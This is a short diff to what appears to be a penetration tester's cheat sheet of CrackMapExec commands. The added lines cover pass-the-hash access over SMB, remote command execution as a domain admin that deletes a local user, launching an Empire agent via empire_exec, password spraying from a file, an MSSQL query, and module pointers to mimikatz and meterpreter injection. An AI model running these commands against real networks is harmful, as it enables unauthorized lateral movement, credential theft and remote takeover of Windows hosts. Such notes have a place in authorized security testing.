@@ -10,11 +10,21 @@ crackmapexec ip_new.txt -t 100 -u Administrator -p 'XXXXXX' -d WORKGROUP
 
 === NEW ===
 SMB
+----
 
-crackmapexec.py smb IPs.txt -u User -H 33445678902bbbe760ea1f1234567890 -M empire_exec -o LISTENER=CME
+crackmapexec 1.2.3.4 -d DOMAIN -u domainadmin -p password -x 'net user newlocaluser /del'
 
-crackmapexe.py 10.10.10.10 -u dude -p /home/passfile.txt
+crackmapexec smb IPs.txt -u User -H 33445678902bbbe760ea1f1234567890 -M empire_exec -o LISTENER=CME
+
+crackmapexe 10.10.10.10 -u dude -p /home/passfile.txt
 
 MYSQL
+-----
 
 crackmapexec mssql -d . -u user -p pass -q 'select @@Version'
+
+MODULE
+------
+
+com_exec -> mimikatz
+com_exec -> meterpreter_inject
